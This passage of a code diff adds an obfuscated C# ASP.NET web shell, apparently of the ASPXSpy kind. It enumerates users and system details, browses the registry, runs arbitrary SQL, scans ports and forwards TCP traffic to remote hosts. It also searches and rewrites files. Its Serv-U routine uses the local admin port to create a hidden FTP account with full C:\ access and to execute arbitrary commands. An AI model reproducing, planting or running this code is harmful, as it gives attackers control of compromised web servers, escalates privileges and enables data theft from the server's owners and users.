+td.Text=dt.Rows[j]["Name"].ToString();
+tr.Controls.Add(td);
+}
+if(i==4)
+{
+td.Text=dt.Rows[j]["PathName"].ToString();
+tr.Controls.Add(td);
+}
+if(i==5)
+{
+string ilH=dt.Rows[j]["State"].ToString();
+if(ilH=="Running")
+{
+td.Text="<font color=green>"+ilH+"</font>";
+}
+else
+{
+td.Text="<font color=red>"+ilH+"</font>";
+}
+tr.Controls.Add(td);
+}
+if(i==6)
+{
+td.Text=dt.Rows[j]["StartMode"].ToString();
+tr.Controls.Add(td);
+}
+}
+lgBS.Controls.Add(tr);
+}
+}
+catch(Exception error)
+{
+MZEy();
+}
+}
+public void mjmlO()
+{
+try
+{
+gESS();
+WCc.Visible=true;
+Bin_H2_Title.InnerText="User Information >>";
+DirectoryEntry Omza=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());
+foreach(DirectoryEntry child in Omza.Children)
+{
+foreach(string name in child.Properties.PropertyNames)
+{
+// Response.Write(name+":"+ child.Properties[name] +"<br>");
+PropertyValueCollection pvc=child.Properties[name];
+int c=pvc.Count;
+for(int i=0;i<c;i++)
+{
+if(name!="objectSid" && name!="Parameters" && name!="LoginHours")
+{
+string bg=sTBx();
+TableRow tr=new TableRow();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+TableCell td=new TableCell();
+td.Text=name;
+tr.Controls.Add(td);
+TableCell td1=new TableCell();
+td1.Text=pvc[i].ToString();
+tr.Controls.Add(td1);
+apu.Controls.Add(tr);
+}
+}
+}
+TableRow trn=new TableRow();
+for(int x=1;x<3;x++)
+{
+TableCell tdn=new TableCell();
+tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
+trn.Controls.Add(tdn);
+apu.Controls.Add(trn);
+}
+}
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+public void gkqX()
+{
+try
+{
+gESS();
+WCc.Visible=true;
+Bin_H2_Title.InnerText="User Information >>";
+DataTable user=Awr("Win32_UserAccount");
+for(int i=0;i<user.Rows.Count;i++)
+{
+for(int j=0;j<user.Columns.Count;j++)
+{
+string bg=sTBx();
+TableRow tr=new TableRow();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+TableCell td=new TableCell();
+td.Text=user.Columns[j].ToString();
+tr.Controls.Add(td);
+TableCell td1=new TableCell();
+td1.Text=user.Rows[i][j].ToString();
+tr.Controls.Add(td1);
+apu.Controls.Add(tr);
+}
+TableRow trn=new TableRow();
+for(int x=1;x<3;x++)
+{
+TableCell tdn=new TableCell();
+tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
+trn.Controls.Add(tdn);
+apu.Controls.Add(trn);
+}
+}
+}
+catch(Exception error)
+{
+mjmlO();
+}
+}
+public void Qpkp()
+{
+try
+{
+RegistryKey zNMcY=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
+string WeqS=SMr(zNMcY,"PortNumber");
+RegistryKey HOEX=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");
+int cpu=HOEX.SubKeyCount;
+RegistryKey yYcE=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");
+string MTln=SMr(yYcE,"ProcessorNameString");
+gESS();
+iWHDm.Visible=true;
+Bin_H2_Title.InnerText="System Information >>";
+Bin_H2_Mac.InnerText="MAC Information >>";
+Bin_H2_Driver.InnerText="Driver Information >>";
+StringBuilder XvJ=new StringBuilder();
+StringBuilder HxiF=new StringBuilder();
+StringBuilder aAufn=new StringBuilder();
+XvJ.Append("<li><u>Server Domain : </u>"+Request.ServerVariables["SERVER_NAME"]+"</li>");
+XvJ.Append("<li><u>Server Ip : </u>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"</li>");
+XvJ.Append("<li><u>Terminal Port : </u>"+WeqS+"</li>");
+XvJ.Append("<li><u>Server OS : </u>"+Environment.OSVersion+"</li>");
+XvJ.Append("<li><u>Server Software : </u>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</li>");
+XvJ.Append("<li><u>Server UserName : </u>"+Environment.UserName+"</li>");
+XvJ.Append("<li><u>Server Time : </u>"+System.DateTime.Now.ToString()+"</li>");
+XvJ.Append("<li><u>Server TimeZone : </u>"+Awr("Win32_TimeZone").Rows[0]["Caption"]+"</li>");
+DataTable BIOS=Awr("Win32_BIOS");
+XvJ.Append("<li><u>Server BIOS : </u>"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"</li>");
+XvJ.Append("<li><u>CPU Count : </u>"+cpu.ToString()+"</li>");
+XvJ.Append("<li><u>CPU Version : </u>"+MTln+"</li>");
+DataTable QViw=Awr("Win32_PhysicalMemory");
+Int64 MwbB=0;
+for(int i=0;i<QViw.Rows.Count;i++)
+{
+MwbB+=Int64.Parse(QViw.Rows[0]["Capacity"].ToString());
+}
+XvJ.Append("<li><u>Server QViw : </u>"+YOls(MwbB)+"</li>");
+DataTable vAP=Awr("Win32_NetworkAdapterConfiguration");
+for(int i=0;i<vAP.Rows.Count;i++)
+{
+HxiF.Append("<li><u>Server MAC"+i+" : </u>"+vAP.Rows[i]["Caption"]+"</li>");
+if(vAP.Rows[i]["MACAddress"]!=string.Empty)
+{
+HxiF.Append("<li style=\"list-style:none;\"><u>Address : </u>"+vAP.Rows[i]["MACAddress"]+"</li>");
+}
+}
+DataTable Driver=Awr("Win32_SystemDriver");
+for (int i=0; i<Driver.Rows.Count; i++)
+{
+aAufn.Append("<li><u class='u1'>Server Driver"+i+" : </u><u class='u2'>"+Driver.Rows[i]["Caption"]+"</u> ");
+//aAufn.Append("<li><u class='u1'>Server Driver"+i+" : "+Driver.Rows[i]["Caption"]+"</u>");
+if (Driver.Rows[i]["PathName"]!=string.Empty)
+{
+aAufn.Append("Path : "+Driver.Rows[i]["PathName"]);
+}
+else
+{
+aAufn.Append("No path information");
+}
+aAufn.Append("</li>");
+}
+Bin_Ul_Sys.InnerHtml=XvJ.ToString();
+Bin_Ul_NetConfig.InnerHtml=HxiF.ToString();
+Bin_Ul_Driver.InnerHtml=aAufn.ToString();
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+public void FaAh()
+{
+gESS();
+uPFH.Visible=true;
+Bin_H2_Title.InnerText="Serv-U Exec >>";
+}
+public void mWEG()
+{
+string nwW=string.Empty;
+string user=CDRf.Value;
+string pass=dFUE.Value;
+int port=Int32.Parse(MlEe.Value);
+string cmd=AzsA.Value;
+string CIX="user "+user+"\r\n";
+string rET="pass "+pass+"\r\n";
+string site="SITE MAINTENANCE\r\n";
+string kaYs="-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
+string MKuz="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
+string BtTeE="-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
+string vvv="QUIT\r\n";
+jAFeu.Visible=true;
+try
+{
+tcp.Connect("127.0.0.1",port);
+tcp.ReceiveBufferSize=1024;
+NS=tcp.GetStream();
+Rev(NS);
+cGZP(NS,CIX);
+Rev(NS);
+cGZP(NS,rET);
+Rev(NS);
+cGZP(NS,site);
+Rev(NS);
+cGZP(NS,kaYs);
+Rev(NS);
+cGZP(NS,MKuz);
+Rev(NS);
+cGZP(NS,BtTeE);
+Rev(NS);
+Bin_Td_Res.InnerHtml+="<font color=\"green\"><b>Exec Cmd.................\r\n</b></font>";
+AyFj.Connect(Request.ServerVariables["LOCAL_ADDR"],52521);
+NS1=AyFj.GetStream();
+Rev(NS1);
+cGZP(NS1,"user bin\r\n");
+Rev(NS1);
+cGZP(NS1,"pass binftp\r\n");
+Rev(NS1);
+cGZP(NS1,"site exec "+cmd+"\r\n");
+Rev(NS1);
+cGZP(NS1,"quit\r\n");
+Rev(NS1);
+AyFj.Close();
+cGZP(NS,kaYs);
+Rev(NS);
+tcp.Close();
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+protected void Rev(NetworkStream instream)
+{
+string WyCjA=string.Empty;
+if(instream.CanRead)
+{
+byte[] OdSn=new byte[1024];
+do
+{
+System.Threading.Thread.Sleep(50);
+int len=instream.Read(OdSn,0,OdSn.Length);
+WyCjA+=Encoding.Default.GetString(OdSn,0,len);
+}
+while(instream.DataAvailable);
+}
+Bin_Td_Res.InnerHtml+="<font color=red>"+WyCjA.Replace("\0","")+"</font>";
+}
+protected void cGZP(NetworkStream instream,string Sendstr)
+{
+if(instream.CanWrite)
+{
+byte[] OdSn=Encoding.Default.GetBytes(Sendstr);
+instream.Write(OdSn,0,OdSn.Length);
+}
+Bin_Td_Res.InnerHtml+="<font color=blue>"+Sendstr+"</font>";
+}
+public void SgF()
+{
+gESS();
+VFlTs.Visible=true;
+Bin_H2_Title.InnerText="RegShell >>";
+string ZDRK=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
+tYH.Text="";
+foreach(string rootkey in ZDRK.Split('|'))
+{
+tYH.Text+="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+kCSO(rootkey)+"')\">"+rootkey+"</a> | ";
+}
+JtR();
+}
+protected void JtR()
+{
+BfO.Text="";
+string ZDRK=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
+TableRow tr;
+TableCell tc;
+foreach(string rootkey in ZDRK.Split('|'))
+{
+tr=new TableRow();
+tc=new TableCell();
+string bg=sTBx();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tc.Width=Unit.Parse("40%");
+tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+kCSO(rootkey)+"')\">"+rootkey+"</a>";
+tr.Cells.Add(tc);
+tc=new TableCell();
+tc.Width=Unit.Parse("60%");
+tc.Text="&lt;RootKey&gt;";
+tr.Cells.Add(tc);
+RueK.Rows.Add(tr);
+}
+}
+protected void pkYH(string Reg_Path)
+{
+if(!Reg_Path.EndsWith("\\"))
+{
+Reg_Path=Reg_Path+"\\";
+}
+BfO.Text=Reg_Path;
+string zUxIN=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
+zUxIN=Regex.Replace(zUxIN,@"\\+","\\");
+TableRow tr=new TableRow();
+TableCell tc=new TableCell();
+string bg=sTBx();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+kCSO(zUxIN)+"')\">Parent Key</a>";
+tc.Attributes["colspan"]="2" ;
+tr.Cells.Add(tc);
+RueK.Rows.Add(tr);
+try
+{
+string subpath;
+string lXoJ=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
+RegistryKey rk=null;
+RegistryKey sk;
+if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE"))
+{
+rk=Registry.LocalMachine;
+}
+else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT"))
+{
+rk=Registry.ClassesRoot;
+}
+else if(Reg_Path.StartsWith("HKEY_CURRENT_USER"))
+{
+rk=Registry.CurrentUser;
+}
+else if(Reg_Path.StartsWith("HKEY_USERS"))
+{
+rk=Registry.Users;
+}
+else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG"))
+{
+rk=Registry.CurrentConfig;
+}
+if(lXoJ.Length>1)
+{
+sk=rk.OpenSubKey(lXoJ);
+}
+else
+{
+sk=rk;
+}
+foreach(string innerSubKey in sk.GetSubKeyNames())
+{
+tr=new TableRow();
+tc=new TableCell();
+bg=sTBx();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tc.Width=Unit.Parse("40%");
+tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+kCSO(Reg_Path+innerSubKey)+"')\">"+innerSubKey+"</a>";
+tr.Cells.Add(tc);
+tc=new TableCell();
+tc.Width=Unit.Parse("60%");
+tc.Text="&lt;SubKey&gt;";
+tr.Cells.Add(tc);
+RueK.Rows.Add(tr);
+}
+TableRow EPPkP=new TableRow();
+EPPkP.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
+EPPkP.Attributes["bgcolor"]="#dddddd";
+TableCell kGnFx=new TableCell();
+kGnFx.Attributes["colspan"]="2" ;
+kGnFx.Attributes["height"]="5";
+EPPkP.Cells.Add(kGnFx);
+RueK.Rows.Add(EPPkP);
+foreach(string strValueName in sk.GetValueNames())
+{
+tr=new TableRow();
+tc=new TableCell();
+bg=sTBx();
+tr.Attributes["onmouseover"]="this.className='focus';";
+tr.CssClass=bg;
+tr.Attributes["onmouseout"]="this.className='"+bg+"';";
+tc.Width=Unit.Parse("40%");
+tc.Text=strValueName;
+tr.Cells.Add(tc);
+tc=new TableCell();
+tc.Width=Unit.Parse("60%");
+tc.Text=SMr(sk,strValueName);
+tr.Cells.Add(tc);
+RueK.Rows.Add(tr);
+}
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+}
+public string SMr(RegistryKey sk,string strValueName)
+{
+object OdSn;
+string fMmU="";
+try
+{
+OdSn=sk.GetValue(strValueName,"NULL");
+if(OdSn.GetType()==typeof(byte[]))
+{
+foreach(byte tmpbyte in(byte[])OdSn)
+{
+if((int)tmpbyte<16)
+{
+fMmU+="0";
+}
+fMmU+=tmpbyte.ToString("X");
+}
+}
+else if(OdSn.GetType()==typeof(string[]))
+{
+foreach(string tmpstr in(string[])OdSn)
+{
+fMmU+=tmpstr;
+}
+}
+else
+{
+fMmU=OdSn.ToString();
+}
+}
+catch(Exception error)
+{
+ECIxe(error.Message);
+}
+return fMmU;
+}
+public void GXO()
+{
+gESS();
+kOGo.Visible=true;
+Bin_H2_Title.InnerText="PortScan >>";
+}
+public void WPv()
+{
+gESS();
+yhTL.Visible=true;
+TIaO.Visible=false;
+Bin_H2_Title.InnerText="DataBase >>";
+}
+protected void lRR()
+{
+if(WDmM.State==ConnectionState.Closed)
+{
+try
+{
+WDmM.ConnectionString=lqD.Text;
+QQdt.Connection=WDmM;
+WDmM.Open();
+}
+catch(Exception Error)
+{
+ECIxe(Error.Message);
+}
+}
+}
+protected void RpwO()
+{
+if(WDmM.State==ConnectionState.Open)
+WDmM.Close();
+WDmM.Dispose();
+QQdt.Dispose();
+}
+public DataTable lAmt(string sqlstr)
+{
+OleDbDataAdapter da=new OleDbDataAdapter();
+DataTable WYg=new DataTable();
+try
+{
+lRR();
+QQdt.CommandType=CommandType.Text;
+QQdt.CommandText=sqlstr;
+da.SelectCommand=QQdt;
+da.Fill(WYg);
+}
+catch(Exception)
+{
+}
+finally
+{
+RpwO();
+}
+return WYg;
+}
+public DataTable[] Bin_Data(string query)
+{
+ArrayList list=new ArrayList();
+try
+{
+string str;
+lRR();
+query=query+"\r\n";
+MatchCollection gxjE=new Regex("[\r\n][gG][oO][\r\n]").Matches(query);
+int eete=0;
+for(int i=0;i<gxjE.Count;i++)
+{
+Match jwFJ=gxjE[i];
+str=query.Substring(eete,jwFJ.Index-eete);
+if(str.Trim().Length>0)
+{
+OleDbDataAdapter rmqO=new OleDbDataAdapter();
+QQdt.CommandType=CommandType.Text;
+QQdt.CommandText=str.Trim();
+rmqO.SelectCommand=QQdt;
+DataSet MUZD=new DataSet();
+rmqO.Fill(MUZD);
+for(int j=0;j<MUZD.Tables.Count;j++)
+{
+list.Add(MUZD.Tables[j]);
+}
+}
+eete=jwFJ.Index+3;
+}
+str=query.Substring(eete,query.Length-eete);
+if(str.Trim().Length>0)
+{
+OleDbDataAdapter qWjEf=new OleDbDataAdapter();
+QQdt.CommandType=CommandType.Text;
+QQdt.CommandText=str.Trim();
+qWjEf.SelectCommand=QQdt;
+DataSet RqF=new DataSet();
+qWjEf.Fill(RqF);
+for(int k=0;k<RqF.Tables.Count;k++)
+{
+list.Add(RqF.Tables[k]);
+}
+}
+}
+catch(SqlException e)
+{
+ECIxe(e.Message);
+rVfN.Visible=false;
+}
+return(DataTable[])list.ToArray(typeof(DataTable));
+}
+public void pOI(string instr)
+{
+try
+{
+lRR();
+QQdt.CommandType=CommandType.Text;
+QQdt.CommandText=instr;
+QQdt.ExecuteNonQuery();
+}
+catch(Exception e)
+{
+ECIxe(e.Message);
+}
+}
+public void IgvZQ()
+{
+try
+{
+lRR();
+if(vin.SelectedItem.Text=="MSSQL")
+{
+if(bUat.SelectedItem.Value!="")
+{
+WDmM.ChangeDatabase(bUat.SelectedItem.Value.ToString());
+}
+}
+DataTable[] dLXI=null;
+dLXI=Bin_Data(KFLaa.InnerText);
+if(dLXI!=null && dLXI.Length>0)
+{
+for(int j=0;j<dLXI.Length;j++)
+{
+rVfN.PreRender+=new EventHandler(euZC);
+rVfN.DataSource=dLXI[j];
+rVfN.DataBind();
+for(int i=0;i<rVfN.Items.Count;i++)
+{
+string bg=sTBx();
+rVfN.Items[i].CssClass=bg;
+rVfN.Items[i].Attributes["onmouseover"]="this.className='focus';";
+rVfN.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
+}
+}
+}
+else
+{
+rVfN.DataSource=null;
+rVfN.DataBind();
+}
+rVfN.Visible=true;
+}
+catch(Exception e)
+{
+ECIxe(e.Message);
+rVfN.Visible=false;
+}
+}
+public void iRQ()
+{
+try
+{
+if(vin.SelectedItem.Text=="MSSQL")
+{
+if(bUat.SelectedItem.Value=="")
+{
+rVfN.DataSource=null;
+rVfN.DataBind();
+return;
+}
+}
+lRR();
+DataTable swxz=new DataTable();
+DataTable dLXI=new DataTable();
+DataTable BXPr=new DataTable();
+if(vin.SelectedItem.Text=="MSSQL" && bUat.SelectedItem.Value!="")
+{
+WDmM.ChangeDatabase(bUat.SelectedItem.Text);
+}
+swxz=WDmM.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"SYSTEM TABLE" });
+dLXI=WDmM.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"TABLE" });
+foreach(DataRow dr in swxz.Rows)
+{
+dLXI.ImportRow(dr);
+}
+dLXI.Columns.Remove("TABLE_CATALOG");dLXI.Columns.Remove("TABLE_SCHEMA");dLXI.Columns.Remove("DESCRIPTION");dLXI.Columns.Remove("TABLE_PROPID");
+rVfN.PreRender+=new EventHandler(euZC);
+rVfN.DataSource=dLXI;
+rVfN.DataBind();
+for(int i=0;i<rVfN.Items.Count;i++)
+{
+string bg=sTBx();
+rVfN.Items[i].CssClass=bg;
+rVfN.Items[i].Attributes["onmouseover"]="this.className='focus';";
+rVfN.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
+}
+rVfN.Visible=true;
+}
+catch(Exception e)
+{
+ECIxe(e.Message);
+rVfN.Visible=false;
+}
+}
+private void euZC(object sender,EventArgs e)
+{
+DataGrid d=(DataGrid)sender;
+foreach(DataGridItem item in d.Items)
+{
+foreach(TableCell t in item.Cells)
+{
+// t.Text=Server.HtmlEncode(t.Text);
+t.Text=t.Text.Replace("<","&lt;").Replace(">","&gt;");
+}
+}
+}
+public void caiGE()
+{
+TIaO.Visible=true;
+try
+{
+KFLaa.InnerHtml=string.Empty;
+if(vin.SelectedItem.Text=="MSSQL")
+{
+rVfN.Visible=false;
+zUY.Visible=true;
+QKsC.Visible=true;
+lRR();
+DataTable ver=lAmt(@"SELECT @@VERSION");
+DataTable dbs=lAmt(@"SELECT name FROM master.dbo.sysdatabases");
+DataTable cdb=lAmt(@"SELECT DB_NAME()");
+DataTable rol=lAmt(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
+DataTable Cox=lAmt(@"SELECT IS_MEMBER('db_owner')");
+string ZMqm=ver.Rows[0][0].ToString();
+string dbo=string.Empty;
+if(Cox.Rows[0][0].ToString()=="1")
+{
+dbo="db_owner";
+}
+else
+{
+dbo="public";
+}
+if(rol.Rows[0][0].ToString()=="1")
+{
+dbo="<font color=blue>sa</font>";
+}
+string db_name=string.Empty;
+foreach(ListItem item in LBu.Items)
+{
+ if(item.Selected=true)
+ {
+ item.Selected=false;
+ }
+}
+bUat.Items.Clear();
+bUat.Items.Add("-- Select a DataBase --");
+bUat.Items[0].Value="";
+for(int i=0;i<dbs.Rows.Count;i++)
+{
+db_name+=dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(),"<font color=blue>"+cdb.Rows[0][0].ToString()+"</font>")+"&nbsp;|&nbsp;";
+bUat.Items.Add(dbs.Rows[i][0].ToString());
+}
+QKsC.InnerHtml="<p><font color=red>MSSQL Version</font> : <i><b>"+ZMqm+"</b></i></p><p><font color=red>SrvRoleMember</font> : <i><b>"+dbo+"</b></i></p>";
+}
+else
+{
+zUY.Visible=false;
+QKsC.Visible=false;
+iRQ();
+}
+}
+catch(Exception e)
+{
+//ECIxe(e.Message);
+TIaO.Visible=false;
+}
+}
+public void xikE()
+{
+gESS();
+Juh.Visible=true;
+Bin_H2_Title.InnerText="PortMap >>";
+}
+public class PortForward
+{
+public string Localaddress;
+public int LocalPort;
+public string RemoteAddress;
+public int RemotePort;
+string type;
+Socket ltcpClient;
+Socket rtcpClient;
+Socket server;
+byte[] LiiZ=new byte[2048];
+byte[] DquQ=new byte[2048];
+public struct session
+{
+public Socket rdel;
+public Socket ldel;
+public int llen;
+public int rlen;
+}
+public static IPEndPoint AnXo(string host,int port)
+{
+IPEndPoint iep=null;
+IPHostEntry FLjY=Dns.Resolve(host);
+IPAddress nCJ=FLjY.AddressList[0];
+iep=new IPEndPoint(nCJ,port);
+return iep;
+}
+public void Start(string Rip,int Rport,string lip,int lport)
+{
+try
+{
+LocalPort=lport;
+RemoteAddress=Rip;
+RemotePort=Rport;
+Localaddress=lip;
+rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
+ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
+rtcpClient.BeginConnect(AnXo(RemoteAddress,RemotePort),new AsyncCallback(rKfrN),rtcpClient);
+}
+catch (Exception ex) { }
+}
+protected void rKfrN(IAsyncResult ar)
+{
+try
+{
+session DItM=new session();
+DItM.ldel=ltcpClient;
+DItM.rdel=rtcpClient;
+ltcpClient.BeginConnect(AnXo(Localaddress,LocalPort),new AsyncCallback(ZZWjr),DItM);
+}
+catch (Exception ex) { }
+}
+protected void ZZWjr(IAsyncResult ar)
+{
+try
+{
+session DItM=(session)ar.AsyncState;
+ltcpClient.EndConnect(ar);
+DItM.rdel.BeginReceive(LiiZ,0,LiiZ.Length,SocketFlags.None,new AsyncCallback(jaRb),DItM);
+DItM.ldel.BeginReceive(DquQ,0,DquQ.Length,SocketFlags.None,new AsyncCallback(LkI),DItM);
+}
+catch (Exception ex) { }
+}
+private void jaRb(IAsyncResult ar)
+{
+try
+{
+session DItM=(session)ar.AsyncState;
+int Ret=DItM.rdel.EndReceive(ar);
+if (Ret>0)
+ltcpClient.BeginSend(LiiZ,0,Ret,SocketFlags.None,new AsyncCallback(qqoI),DItM);
+else WJOg();
+}
+catch (Exception ex) { }
+}
+private void qqoI(IAsyncResult ar)
+{
+try
+{
+session DItM=(session)ar.AsyncState;
+DItM.ldel.EndSend(ar);
+DItM.rdel.BeginReceive(LiiZ,0,LiiZ.Length,SocketFlags.None,new AsyncCallback(this.jaRb),DItM);
+}
+catch (Exception ex) { }
+}
+private void LkI(IAsyncResult ar)
+{
+try
+{
+session DItM=(session)ar.AsyncState;
+int Ret=DItM.ldel.EndReceive(ar);
+if (Ret>0)
+DItM.rdel.BeginSend(DquQ,0,Ret,SocketFlags.None,new AsyncCallback(kbu),DItM);
+else WJOg();
+}
+catch (Exception ex) { }
+}
+private void kbu(IAsyncResult ar)
+{
+try
+{
+session DItM=(session)ar.AsyncState;
+DItM.rdel.EndSend(ar);
+DItM.ldel.BeginReceive(DquQ,0,DquQ.Length,SocketFlags.None,new AsyncCallback(this.LkI),DItM);
+}
+catch (Exception ex) { }
+}
+public void WJOg()
+{
+try
+{
+if (ltcpClient!=null)
+{
+ltcpClient.Close();
+}
+if (rtcpClient!=null)
+rtcpClient.Close();
+}
+catch (Exception ex) { }
+}
+}
+protected void KMn()
+{
+PortForward toDS=new PortForward();
+toDS.WJOg();
+}
+protected void oTfrj()
+{
+PortForward toDS=new PortForward();
+toDS.Start(IPRwP.Value,int.Parse(qICb.Value),xuby.Value,int.Parse(Mcou.Value));
+}
+public string gzJN(string instr)
+{
+string tmp=null;
+try
+{
+tmp=System.Net.Dns.Resolve(instr).AddressList[0].ToString();
+}
+catch(Exception e)
+{
+}
+return tmp;
+}
+public void ftDf()
+{
+string[] ghge=ZUUG.Text.ToString().Split(',');
+for(int i=0;i<ghge.Length;i++)
+{
+kAtA.Add(new ScanPort(gzJN(rQz.Text.ToString()),Int32.Parse(ghge[i])));
+}
+try
+{
+Thread[] meHiq=new Thread[kAtA.Count];
+int PTmoh=0;
+for(PTmoh=0;PTmoh<kAtA.Count;PTmoh++)
+{
+meHiq[PTmoh]=new Thread(new ThreadStart(((ScanPort)kAtA[PTmoh]).Scan));
+meHiq[PTmoh].Start();
+}
+for(PTmoh=0;PTmoh<meHiq.Length;PTmoh++)
+meHiq[PTmoh].Join();
+}
+catch
+{
+}
+}
+public class ScanPort
+{
+private string _ip="";
+private int vkKq=0;
+private TimeSpan _timeSpent;
+private string uZkh="Not scanned";
+public string ip
+{
+get { return _ip;}
+}
+public int port
+{
+get { return vkKq;}
+}
+public string status
+{
+get { return uZkh;}
+}
+public TimeSpan timeSpent
+{
+get { return _timeSpent;}
+}
+public ScanPort(string ip,int port)
+{
+_ip=ip;
+vkKq=port;
+}
+public void Scan()
+{
+TcpClient SoWrK=new TcpClient();
+DateTime KcHE=DateTime.Now;
+try
+{
+SoWrK.Connect(_ip,vkKq);
+SoWrK.Close();
+uZkh="<font color=green><b>Open</b></font>";
+}
+catch
+{
+uZkh="<font color=red><b>Close</b></font>";
+}
+_timeSpent=DateTime.Now.Subtract(KcHE);
+}
+}
+public static void TzA(System.Web.UI.Page page)
+{
+page.RegisterHiddenField("__EVENTTARGET","");
+page.RegisterHiddenField("__FILE","");
+string s=@"<script language=Javascript>";
+s+=@"function Bin_PostBack(eventTarget,eventArgument)";
+s+=@"{";
+s+=@"var theform=document.forms[0];";
+s+=@"theform.__EVENTTARGET.value=eventTarget;";
+s+=@"theform.__FILE.value=eventArgument;";
+s+=@"theform.submit();";
+s+=@"} ";
+s+=@"</scr"+"ipt>";
+page.RegisterStartupScript("",s);
+}
+protected void nCD(object sender,EventArgs e)
+{
+gESS();
+pNH.Visible=true;
+Bin_H2_Title.InnerText="File Search >>";
+jxF.Value=Request.PhysicalApplicationPath;
+KYpMc.Visible=false;
+}
+protected void hTX(object sender,EventArgs e)
+{
+DirectoryInfo QJdf=new DirectoryInfo(jxF.Value);
+if(!QJdf.Exists)
+{
+ECIxe("Path invalid ! ");
+return;
+}
+ADR(QJdf);
+ECIxe("Search completed ! ");
+}
+public void ADR(DirectoryInfo dir)
+{
+KYpMc.Visible=true;
+foreach(FileInfo Bin_Files in dir.GetFiles())
+{
+try
+{
+if(Bin_Files.FullName==Request.PhysicalPath)
+{
+continue;
+}
+if(!Regex.IsMatch(Bin_Files.Extension.Replace(".",""),"^("+yUn.Value+")$",RegexOptions.IgnoreCase))
+{
+continue;
+}
+if(HUxGY.SelectedItem.Value=="name")
+{
+if(FVfS.Checked)
+{
+if(Regex.IsMatch(Bin_Files.Name,yvLU.Value,RegexOptions.IgnoreCase))
+{
+ZRu(Bin_Files);
+}
+}
+else
+{
+if(Bin_Files.Name.ToLower().IndexOf(yvLU.Value.ToLower())!=-1)
+{
+Response.Write(Bin_Files.FullName);
+ZRu(Bin_Files);
+}
+}
+}
+else
+{
+StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);
+string EPI=sr.ReadToEnd();
+sr.Close();
+if(FVfS.Checked)
+{
+if(Regex.IsMatch(EPI,yvLU.Value,RegexOptions.IgnoreCase))
+{
+ZRu(Bin_Files);
+if(NlwU.Checked)
+{
+EPI=Regex.Replace(EPI,yvLU.Value,qEt.Value,RegexOptions.IgnoreCase);
+StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
+sw.Write(EPI);
+sw.Close();
+}
+}
+}
+else
+{
+if(EPI.ToLower().IndexOf(yvLU.Value.ToLower())!=-1)
+{
+ZRu(Bin_Files);
+if(NlwU.Checked)
+{
